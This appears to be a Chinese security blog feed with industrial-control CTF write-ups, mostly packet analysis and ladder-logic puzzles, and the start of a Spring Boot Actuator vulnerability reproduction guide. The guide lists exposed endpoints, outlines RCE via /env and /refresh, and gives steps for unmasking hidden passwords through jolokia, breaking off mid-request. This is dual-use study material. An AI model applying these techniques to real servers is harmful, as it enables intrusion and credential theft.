        <content type="html"><![CDATA[<h2 id="第一场"><a href="#第一场" class="headerlink" title="第一场"></a>第一场</h2><h3 id="损坏的风机"><a href="#损坏的风机" class="headerlink" title="损坏的风机"></a>损坏的风机</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>小明是一家新能源汽车制造厂的风机操作员，每天的工作是根据工厂的实时温度输入风机的转数，但由于机器的老化，风机最多能接受2000转&#x2F;分钟的转速，在当天下班后，检修人员发现风机由于转速过快出现了故障，请根据维修人员捕获的流量包分析当天风机的转速达到了多少转才出现的故障，flag为发送高额转速的Data层的HEX数据。flag格式为:flag{}</p><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><ol><li>首先筛选出modbus协议的数据包</li><li>根据题目提示<code>输入风机的转数</code>，对数据包info中带有<code>Write Single Register</code>的数据包进行分析，发现只有706号数据包传输的数据大于2000，<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210705142553.png" alt="20210705142553"></li><li>提取data层hex数据即为flag{4d0000000006010600000bb8}</li></ol><h2 id="第二场"><a href="#第二场" class="headerlink" title="第二场"></a>第二场</h2><h3 id="异常的Fins协议分析"><a href="#异常的Fins协议分析" class="headerlink" title="异常的Fins协议分析"></a>异常的Fins协议分析</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>某天工业现场生产线设备出现故障报警，请通过事发时的数据包分析报警原因，找到flag。flag格式为:flag{}。</p><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><ol><li>直接用科来网络分析系统一把梭，打开数据包进行重放，在诊断项里面找到故障数据包，作为flag进行提交👌。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210705151003.png" alt="20210705151003"></li></ol><h2 id="第三场"><a href="#第三场" class="headerlink" title="第三场"></a>第三场</h2><h3 id="异常的IEC104分析"><a href="#异常的IEC104分析" class="headerlink" title="异常的IEC104分析"></a>异常的IEC104分析</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>小张在对电力企业进行渗透测试时，发现一台开启IEC104通讯协议的设备，并尝试对该设备进行测试。但是在IDS中发现了相关通讯异常。请尝试找出数据包中的flag。flag格式为:flag{}。</p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><ol><li>用Wireshark打开题目，根据题目名称筛选IEC104协议<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210705154536.png" alt="20210705154536"></li><li>看到IOA119、101、108、132、99、111、109、101猜测可能是ASCII码</li><li>通过ascii码查找119&#x3D;w、101&#x3D;e、108&#x3D;l、99&#x3D;c、111&#x3D;o、109&#x3D;m、101&#x3D;e、132不存在</li><li>因此获取<code>flag&#123;welcome&#125;</code></li></ol><h4 id="解题思路二"><a href="#解题思路二" class="headerlink" title="解题思路二"></a>解题思路二</h4><ol><li>科来软件一把梭<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210706102611.png" alt="20210706102611"></li></ol><h3 id="异常的s7comm"><a href="#异常的s7comm" class="headerlink" title="异常的s7comm"></a>异常的s7comm</h3><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>工程师小夏在针对西门子300PLC设备不定期的停止运行，发现设备存在异常外联控制，再对审计设备进行分析中发现数据包中存在异常的eth.trailer、eth.fcs,请您帮助小夏找到外联地址并发送异常的HEX，对服务器返回的HEX进行解密。flag格式为:flag{}。</p><h4 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h4><ol><li><p>根据管理员的提示，筛选端口37830,发现了外联的IP和异常hex字符串。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210705162033.png" alt="20210705162033"></p></li><li><p>编写脚本与服务器进行通讯，获取响应字符串(这里需要做一下尝试知道需要把trailer和frame check sequence拼接起来)</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"39.105.136.152"</span><span class="token punctuation">,</span> <span class="token number">37830</span><span class="token punctuation">)</span> context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span> c <span class="token operator">=</span> <span class="token string">"21313221fdfcee965a21000000693359784e7051764f714c64497a426e"</span> p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token keyword">print</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210705162318.png" alt="20210705162318"> </p></li><li><p>根据题目提示，要对返回的hex值进行解密，因此需要知道加密方式。查看异常请求的响应，发现一串很像base64编码的字符串，尝试解码，获取<code>TEA （300</code><br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210706090551.png" alt="20210706090551"></p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210706090633.png" alt="20210706090633"></p></li><li><p>因此推测加密方式为TEA，解密密钥为300，解密获取flag<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210706090728.png" alt="20210706090728"><br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210706090742.png" alt="20210706090742"></p></li></ol><h3 id="工控梯形图分析1"><a href="#工控梯形图分析1" class="headerlink" title="工控梯形图分析1"></a>工控梯形图分析1</h3><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>小张在进行设备调试时，编写了一段模拟量转换的程序，已知IW2的值为7750，V14为0.2396091521，请计算出V11的值帮助小张进一步分析，flag为V11与V13之和。flag格式为flag{}。</p><h4 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h4><ol><li>用AutoThink打开题目文件，输入IW2和V14进行仿真，得到V2-V6<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210706093957.png" alt="20210706093957"></li><li>V11&#x3D;V9&#x2F;V6&#x3D;30866&#x2F;2806&#x3D;11，填入数据后再次仿真得V13<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210706100210.png" alt="20210706100210"></li><li>最终获取flag{v11+v13}&#x3D;flag{11.2467985302}</li></ol><h3 id="异常的协议分析"><a href="#异常的协议分析" class="headerlink" title="异常的协议分析"></a>异常的协议分析</h3><h4 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h4><p>小代所在的企业车间PLC发生异常，造成生产线无法正常运行。请您帮助小代分析出PLC遭到异常的原因。flag格式为:flag{}。</p><h4 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h4><ol><li>用Wireshark打开数据包，发现全部是TCP流量，因此只能查找不合规的TCP数据包，在包3043尾部发现额外的字符串。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210706104714.png" alt="20210706104714"></li><li>因为不知道加密方式，用ciphey进行解密,获取flag<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210706162330.png" alt="20210706162330"></li></ol><h4 id="解题思路2"><a href="#解题思路2" class="headerlink" title="解题思路2"></a>解题思路2</h4><ol><li>用科来分析软件打开数据包。发现3041、3042有问题，于是返回看3041-3043发现额外字符串，然后获取flag<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210706163525.png" alt="20210706163525"></li></ol><h3 id="工控指示灯的逻辑推理"><a href="#工控指示灯的逻辑推理" class="headerlink" title="工控指示灯的逻辑推理"></a>工控指示灯的逻辑推理</h3><h4 id="题目描述-6"><a href="#题目描述-6" class="headerlink" title="题目描述"></a>题目描述</h4><p>小明刚刚入门工业自动化领域，某天发现一个很有意思的指示灯梯形图运行过程，你能帮助小明找出flag吗？（详细赛题实例请下载进行查看）,flag格式为flag{}。</p><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><blockquote><p>当PLC把所有输入存储好，程序逻辑开始执行。第一条是执行断检测（常开指令）。指令结果与对应内存的位一致。 诚如这条指令叫常开，正常状态下（内存位为0）触点是打开的，结果是0。如果内存位为1，则触点闭合，结果为1。</p></blockquote><ol><li><a href="https://wenku.baidu.com/view/cb60e869a98271fe910ef969.html">https://wenku.baidu.com/view/cb60e869a98271fe910ef969.html</a></li><li><a href="https://zhuanlan.zhihu.com/p/295392325">https://zhuanlan.zhihu.com/p/295392325</a></li><li><a href="https://blog.csdn.net/lhyhb/article/details/81675997">https://blog.csdn.net/lhyhb/article/details/81675997</a></li></ol><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><ol><li>I0.0接通，M0.0自锁，Q0.0接通，T37计时1s，M0.1接通，Q0.0断开。根据题目用例得：H1T1SP<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210707103731.png" alt="20210707103731"></li><li>M0.0接通，T37计时1s后,M0.1自锁，Q0.1接通，T38计时2s，M0.2接通，Q0.1断开。根据题目用例得：H2M1ST2SP<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210707104427.png" alt="20210707104427"></li><li>M0.1接通，T38计时2s后，M0.2自锁，T39计时4s，Clock_1s闪烁，Q0.2接通，M0.3接通，Q0.2断开。根据题目用例得：H3M3SL4SP<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210707105050.png" alt="20210707105050"></li><li>M0.2接通,T39计时4s后，M0.3自锁，Q0.3接通，T40计时5S，M0.4接通，Q0.3断开。根据题目用例得：H4M7ST5SP<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210707112121.png" alt="20210707112121"></li><li>M0.3接通,T40计时5s后，M0.4自锁，Q0.4接通，T41计时3S，M0.5接通，Q0.4断开。根据题目用例得：H5M12ST3SP<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210707112631.png" alt="20210707112631"></li><li>M0.4接通,T41计时3s后，M0.5自锁，Q0.5接通，T42计时2S，M0.6接通，Q0.5断开。根据题目用例得：H6M15ST2SP<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210707112606.png" alt="20210707112606"></li><li>M0.5接通，T42计时2s后，M0.6自锁，Clock_1s闪烁，Q0.6接通，T43计时4s,循环结束。根据题目用例得：H7M17SL6SP<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210707113105.png" alt="20210707113105"></li><li>最终获得flag{H1T1SP-H2M1ST2SP-H3M3SL4SP-H4M7ST5SP-H5M12ST3SP-H6M15ST2SP-H7M17SL6SP}</li></ol><h3 id="工控梯形图分析2"><a href="#工控梯形图分析2" class="headerlink" title="工控梯形图分析2"></a>工控梯形图分析2</h3><h4 id="题目描述-7"><a href="#题目描述-7" class="headerlink" title="题目描述"></a>题目描述</h4><p>小王是工厂的一名工程师，每天的工作是启动设备进行加工，设备一共进行两次加工。设备在运转过程中突然停止工作，打开梯形图发现其中两个数值丢失，请帮助小王填补数值VD200与VD300，flag为VD200加上VD300。flag格式为flag{VD200_XX_VD300_XX}。</p><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><ol><li>根据梯形图进行计算<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210824140717.png" alt="20210824140717"></li><li>VW0&#x3D;2+4&#x3D;6</li><li>VW2&#x3D;VW0*4&#x3D;24</li><li>VD3&#x3D;Double int(VW2)&#x3D;24</li><li>VD100&#x3D;Real(VD3)&#x3D;24</li><li>VD104&#x3D;Double int(20)&#x3D;20</li><li>VD108&#x3D;Real(VD104)&#x3D;20</li><li>VD112&#x3D;VD100-VD108&#x3D;24-20&#x3D;4</li><li>VD120&#x3D;VD112*VD116&#x3D;4*VD116&#x3D;80.84<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210824152818.png" alt="20210824152818"></li><li>VD200&#x3D;VD116&#x3D;VD120&#x2F;4&#x3D;20.21</li><li>VD300&#x3D;VD116&#x3D;VD120&#x2F;4&#x3D;79.284&#x2F;4&#x3D;19.821</li></ol><ul><li>这里要想清楚一个点，就是1、梯形图是按顺序执行；2、以跑通为目的，所以依次给VD120赋值，最终flag{VD200_20.21_VD300_19.821}</li></ul><h3 id="08智能卡"><a href="#08智能卡" class="headerlink" title="08智能卡"></a>08智能卡</h3><h4 id="题目描述-8"><a href="#题目描述-8" class="headerlink" title="题目描述"></a>题目描述</h4><p>小吕对一张已经过期的Mifare非接触智能卡进行修改，想进行延长智能卡的到期时间。小吕成功对数据解密并将数据dump出来，存为originalData。再将相关文件中的有关时间的数据进行修改并重新写入智能卡中。修改后本卡还是不能使用。小吕再次将卡内数据导出，存为modifyData。你能帮助小吕解决相关智能卡的使用吗？flag是文件的md5值。flag格式为:flag{}。</p><h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p>这题出现了非预期，官方直接把correct.dump白给了。</p><pre class="language-bash" data-language="bash"><code class="language-bash">md5 correct.dumpMD5 <span class="token punctuation">(</span>correct.dump<span class="token punctuation">)</span> <span class="token operator">=</span> 526e683b4f9ccf4aa56e65fc3831929e</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 2021icsc </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CtfHub工控题目练习</title>
      <link href="/ctf/practice/ctfhub-iot/"/>
      <url>/ctf/practice/ctfhub-iot/</url>
      
        <content type="html"><![CDATA[<h3 id="题目一-modbus-2020之江杯"><a href="#题目一-modbus-2020之江杯" class="headerlink" title="题目一 modbus-2020之江杯"></a>题目一 modbus-2020之江杯</h3><blockquote><p>题目描述：工厂车间流水线某工业控制设备遭到不明人员攻击，根据对攻击行为的溯源分析发现攻击者对设备进行了程序上传操作，请根据网络数据流量协助运维人员查找证据找到flag，flag格式为flag{}。</p></blockquote><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h4><p>modbus的工控题目最入门的一种就是直接搜索flag（明文、ascii、hex），这道题就是一道典型的直接搜索flag的题目，一条modbus-RTU所携带的数据为两个字节，因此，追踪Tcp流，搜索fl的hex值。<br><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210701175528.png" alt="20210701175528"></p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210701175715.png" alt="20210701175715"></p><p>这里确定了flag是以十六进制的值隐藏在数据包中以后，就就可以提取flag的十六进制值</p><pre class="language-bash" data-language="bash"><code class="language-bash">strings <span class="token number">6</span>.pcap <span class="token operator">|</span> <span class="token function">grep</span> <span class="token parameter variable">-E</span> <span class="token string">"^.&#123;10&#125;$"</span></code></pre><p>正则表达式的意思匹配10位任何除换行符以外的单字符</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210701181419.png" alt="20210701181419"></p><p>转化即可获取flag</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210701182507.png" alt="20210701182507"></p><h3 id="异常的流量分析-2020之江杯"><a href="#异常的流量分析-2020之江杯" class="headerlink" title="异常的流量分析-2020之江杯"></a>异常的流量分析-2020之江杯</h3><blockquote><p>题目描述：工业网络中存在的异常，尝试通过分析PACP流量包，分析出流量数据中的异常点，并拿到FLAG，flag格式为 flag{}。</p></blockquote><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>这道题用wireshark打开之后追踪TCP流</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210702084831.png" alt="20210702084831"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctfhub </tag>
            
            <tag> iot </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpringBoot相关漏洞复现</title>
      <link href="/pentest/springboot/"/>
      <url>/pentest/springboot/</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文主要是参考各路前辈的文章进行的复现，因此部分区域会因为原理不明出现复制粘贴的情况，因此本文会把参考链接方面前面<br>参考链接：<br>1、<a href="https://github.com/mpgn/Spring-Boot-Actuator-Exploit">https://github.com/mpgn/Spring-Boot-Actuator-Exploit</a><br>2、<a href="https://github.com/LandGrey/SpringBootVulExploit">https://github.com/LandGrey/SpringBootVulExploit</a><br>3、<a href="https://github.com/veracode-research/actuator-testbed">https://github.com/veracode-research/actuator-testbed</a><br>4、<a href="https://www.veracode.com/blog/research/exploiting-spring-boot-actuators">https://www.veracode.com/blog/research/exploiting-spring-boot-actuators</a><br>5、<a href="https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</a><br>6、<a href="https://xz.aliyun.com/t/7811#toc-8">https://xz.aliyun.com/t/7811#toc-8</a></p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>环境搭建相对还是比较简单的，直接把<a href="https://github.com/veracode-research/actuator-testbed.git%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E5%85%8B%E9%9A%86%E4%B8%8B%E6%9D%A5%E5%B0%B1%E8%A1%8C">https://github.com/veracode-research/actuator-testbed.git这个项目克隆下来就行</a></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/veracode-research/actuator-testbed.gitmvn <span class="token function">install</span>mvn springboot:run</code></pre><p>这里简单说一下maven的安装，mac下虽然可以直接用brew install去安装，但是这样安装的maven会指向JDK16，后续调整会相对比较麻烦，因此还是推荐直接下载压缩包。<br>下载地址：<br><a href="https://archive.apache.org/dist/maven/maven-3/">https://archive.apache.org/dist/maven/maven-3/</a><br>下载完成后，解压到你想要放在的目录即可，然后配置环境变量</p><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210604144023.png" alt="20210604144023"></p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#maven</span><span class="token builtin class-name">export</span> <span class="token assign-left variable">M2_HOME</span><span class="token operator">=</span><span class="token string">"/Users/xxx/Desktop/Tools/apache-maven-3.5.0"</span><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$PATH</span>:<span class="token variable">$M2_HOME</span>/bin"</span><span class="token comment">#推荐修改一下默认仓库地址，配置文件在conf/setting.xml</span><span class="token operator">&lt;</span>localRepository<span class="token operator">></span>/Users/xxx/Desktop/Tools/apache-maven-3.5.0/maven_repo<span class="token operator">&lt;</span>/localRepository<span class="token operator">></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210604143926.png" alt="20210604143926"></p><h2 id="Spring-boot和SpringCloud基础知识"><a href="#Spring-boot和SpringCloud基础知识" class="headerlink" title="Spring boot和SpringCloud基础知识"></a>Spring boot和SpringCloud基础知识</h2><h3 id="0x01：路由知识"><a href="#0x01：路由知识" class="headerlink" title="0x01：路由知识"></a>0x01：路由知识</h3><ul><li>Spring boot的路由其实顾名思义，就是对请求和实际页面的一种映射关系</li><li>有些程序员会自定义 <code>/manage</code>、<code>/management</code> 、<strong>项目 App 相关名称</strong>为 spring 根路径</li><li>Spring Boot Actuator 1.x 版本默认内置路由的起始路径为  <code>/</code> ，2.x 版本则统一以 <code>/actuator</code> 为起始路径</li><li>Spring Boot Actuator 默认的内置路由名字，如 <code>/env</code> 有时候也会被程序员修改，比如修改成 <code>/appenv</code></li></ul><h3 id="0x02：版本知识"><a href="#0x02：版本知识" class="headerlink" title="0x02：版本知识"></a>0x02：版本知识</h3><blockquote><p>Spring Cloud 是基于 Spring Boot 来进行构建服务，并提供如配置管理、服务注册与发现、智能路由等常见功能的帮助快速开发分布式系统的系列框架的有序集合。</p></blockquote><h4 id="组件版本的相互依赖关系："><a href="#组件版本的相互依赖关系：" class="headerlink" title="组件版本的相互依赖关系："></a>组件版本的相互依赖关系：</h4><table><thead><tr><th>依赖项</th><th>版本列表及依赖组件版本</th></tr></thead><tbody><tr><td>spring-boot-starter-parent</td><td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-starter-parent">spring-boot-starter-parent</a></td></tr><tr><td>spring-boot-dependencies</td><td><a href="https://mvnrepository.com/artifact/org.springframework.boot/spring-boot-dependencies">spring-boot-dependencies</a></td></tr><tr><td>spring-cloud-dependencies</td><td><a href="https://mvnrepository.com/artifact/org.springframework.cloud/spring-cloud-dependencies">spring-cloud-dependencies</a></td></tr></tbody></table><h4 id="Spring-Cloud-与-Spring-Boot-版本之间的依赖关系："><a href="#Spring-Cloud-与-Spring-Boot-版本之间的依赖关系：" class="headerlink" title="Spring Cloud 与 Spring Boot 版本之间的依赖关系："></a>Spring Cloud 与 Spring Boot 版本之间的依赖关系：</h4><table><thead><tr><th>Spring Cloud 大版本</th><th>Spring Boot 版本</th></tr></thead><tbody><tr><td>Angel</td><td>兼容 Spring Boot 1.2.x</td></tr><tr><td>Brixton</td><td>兼容 Spring Boot 1.3.x、1.4.x</td></tr><tr><td>Camden</td><td>兼容 Spring Boot 1.4.x、1.5.x</td></tr><tr><td>Dalston</td><td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td></tr><tr><td>Edgware</td><td>兼容 Spring Boot 1.5.x，不兼容 2.0.x</td></tr><tr><td>Finchley</td><td>兼容 Spring Boot 2.0.x，不兼容 1.5.x</td></tr><tr><td>Greenwich</td><td>兼容 Spring Boot 2.1.x</td></tr><tr><td>Hoxton</td><td>兼容 Spring Boot 2.2.x</td></tr></tbody></table><p><img src="https://cdn.jsdelivr.net/gh/AMG4MATIC/PicGo/img/20210604144201.png" alt="20210604144201"></p><h4 id="Spring-Cloud-小版本号的后缀及含义"><a href="#Spring-Cloud-小版本号的后缀及含义" class="headerlink" title="Spring Cloud 小版本号的后缀及含义:"></a>Spring Cloud 小版本号的后缀及含义:</h4><table><thead><tr><th>小版本号后缀</th><th>含义</th></tr></thead><tbody><tr><td>BUILD-SNAPSHOT</td><td>快照版，代码不是固定，处于变化之中</td></tr><tr><td>MX</td><td>里程碑版</td></tr><tr><td>RCX</td><td>候选发布版</td></tr><tr><td>RELEASE</td><td>正式发布版</td></tr><tr><td>SRX</td><td>(修复错误和 bug 并再次发布的)正式发布版</td></tr></tbody></table><h2 id="一：信息泄露"><a href="#一：信息泄露" class="headerlink" title="一：信息泄露"></a>一：信息泄露</h2><h3 id="0x01：路由地址及接口调用详情泄漏"><a href="#0x01：路由地址及接口调用详情泄漏" class="headerlink" title="0x01：路由地址及接口调用详情泄漏"></a>0x01：路由地址及接口调用详情泄漏</h3><blockquote><p>开发人员没有意识到地址泄漏会导致安全隐患或者开发环境切换为线上生产环境时，相关人员没有更改配置文件，忘记切换环境配置等</p></blockquote><p>直接访问以下两个 swagger 相关路由，验证漏洞是否存在：</p><pre class="language-bash" data-language="bash"><code class="language-bash">/v2/api-docs/swagger-ui.html</code></pre><p>其他一些可能会遇到的 swagger、swagger codegen、swagger-dubbo 等相关接口路由：</p><pre class="language-bash" data-language="bash"><code class="language-bash">/swagger/api-docs/api.html/swagger-ui/swagger/codes/api/index.html/api/v2/api-docs/v2/swagger.json/swagger-ui/html/distv2/index.html/swagger/index.html/sw/swagger-ui.html/api/swagger-ui.html/static/swagger.json/user/swagger-ui.html/swagger-ui/index.html/swagger-dubbo/api-docs/template/swagger-ui.html/swagger/static/index.html/dubbo-provider/distv2/index.html/spring-security-rest/api/swagger-ui.html/spring-security-oauth-resource/swagger-ui.html</code></pre><p>除此之外，下面的 spring boot actuator 相关路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息：</p><pre class="language-bash" data-language="bash"><code class="language-bash">/mappings/metrics/beans/configprops/actuator/metrics/actuator/mappings/actuator/beans/actuator/configprops</code></pre><p><strong>一般来讲，暴露出 spring boot 应用的相关接口和传参信息并不能算是漏洞</strong>，但是以 “<strong>默认安全</strong>“ 来讲，不暴露出这些信息更加安全。</p><p>对于攻击者来讲，一般会仔细审计暴露出的接口以增加对业务系统的了解，并会同时检查应用系统是否存在未授权访问、越权等其他业务类型漏洞。</p><h3 id="0x02：配置不当而暴露的路由"><a href="#0x02：配置不当而暴露的路由" class="headerlink" title="0x02：配置不当而暴露的路由"></a>0x02：配置不当而暴露的路由</h3><blockquote><p>主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改&#x2F;切换生产环境的配置</p></blockquote><p>参考 <a href="https://docs.spring.io/spring-boot/docs/1.5.10.RELEASE/reference/htmlsingle/#production-ready-endpoints">production-ready-endpoints</a> 和 <a href="https://github.com/artsploit/SecLists/blob/master/Discovery/Web-Content/spring-boot.txt">spring-boot.txt</a>，可能因为配置不当而暴露的默认内置路由可能会有：</p><pre class="language-bash" data-language="bash"><code class="language-bash">/actuator/auditevents/autoconfig/beans/caches/conditions/configprops/docs/dump/env/flyway/health/heapdump/httptrace/info/intergrationgraph/jolokia/logfile/loggers/liquibase/metrics/mappings/prometheus/refresh/scheduledtasks/sessions/shutdown/trace/threaddump/actuator/auditevents/actuator/beans/actuator/health/actuator/conditions/actuator/configprops/actuator/env/actuator/info/actuator/loggers/actuator/heapdump/actuator/threaddump/actuator/metrics/actuator/scheduledtasks/actuator/httptrace/actuator/mappings/actuator/jolokia/actuator/hystrix.stream</code></pre><p>其中对寻找漏洞比较重要接口的有：</p><ul><li><p><code>/env</code>、<code>/actuator/env</code></p><p>GET 请求 <code>/env</code> 会直接泄露环境变量、内网地址、配置中的用户名等信息；当程序员的属性名命名不规范，例如 password 写成 psasword、pwd 时，会泄露密码明文；</p><p>同时有一定概率可以通过 POST 请求 <code>/env</code> 接口设置一些属性，间接触发相关 RCE 漏洞；同时有概率获得星号遮掩的密码、密钥等重要隐私信息的明文。</p></li><li><p><code>/refresh</code>、<code>/actuator/refresh</code></p><p>POST 请求 <code>/env</code> 接口设置属性后，可同时配合 POST 请求 <code>/refresh</code> 接口刷新属性变量来触发相关 RCE 漏洞。</p></li><li><p><code>/restart</code>、<code>/actuator/restart</code></p><p>暴露出此接口的情况较少；可以配合 POST请求 <code>/env</code> 接口设置属性后，再 POST 请求 <code>/restart</code> 接口重启应用来触发相关 RCE 漏洞。</p></li><li><p><code>/jolokia</code>、<code>/actuator/jolokia</code></p><p>可以通过 <code>/jolokia/list</code> 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</p></li><li><p><code>/trace</code>、<code>/actuator/httptrace</code></p><p>一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情；以及有效用户或管理员的 cookie、jwt token 等信息。</p></li></ul><h3 id="0x03：获取被星号脱敏的密码的明文-方法一"><a href="#0x03：获取被星号脱敏的密码的明文-方法一" class="headerlink" title="0x03：获取被星号脱敏的密码的明文 (方法一)"></a>0x03：获取被星号脱敏的密码的明文 (方法一)</h3><blockquote><p>访问 &#x2F;env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果</p></blockquote><h4 id="利用条件："><a href="#利用条件：" class="headerlink" title="利用条件："></a>利用条件：</h4><ul><li>目标网站存在 <code>/jolokia</code> 或 <code>/actuator/jolokia</code> 接口</li><li>目标使用了 <code>jolokia-core</code> 依赖（版本要求暂未知）</li></ul><h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><h5 id="步骤一：-找到想要获取的属性名"><a href="#步骤一：-找到想要获取的属性名" class="headerlink" title="步骤一： 找到想要获取的属性名"></a>步骤一： 找到想要获取的属性名</h5><p>GET 请求目标网站的 <code>/env</code> 或 <code>/actuator/env</code> 接口，搜索 <code>******</code> 关键词，找到想要获取的被星号 * 遮掩的属性值对应的属性名。</p><h5 id="步骤二：-jolokia-调用相关-Mbean-获取明文"><a href="#步骤二：-jolokia-调用相关-Mbean-获取明文" class="headerlink" title="步骤二： jolokia 调用相关 Mbean 获取明文"></a>步骤二： jolokia 调用相关 Mbean 获取明文</h5><p>将下面示例中的 <code>security.user.password</code> 替换为实际要获取的属性名，直接发包；明文值结果包含在 response 数据包中的 <code>value</code> 键中。</p><ul><li>调用 <code>org.springframework.boot</code> Mbean</li></ul><blockquote><p>实际上是调用 org.springframework.boot.admin.SpringApplicationAdminMXBeanRegistrar 类实例的 getProperty 方法</p></blockquote><p>spring 1.x</p><pre class="language-markup" data-language="markup"><code class="language-markup">POST 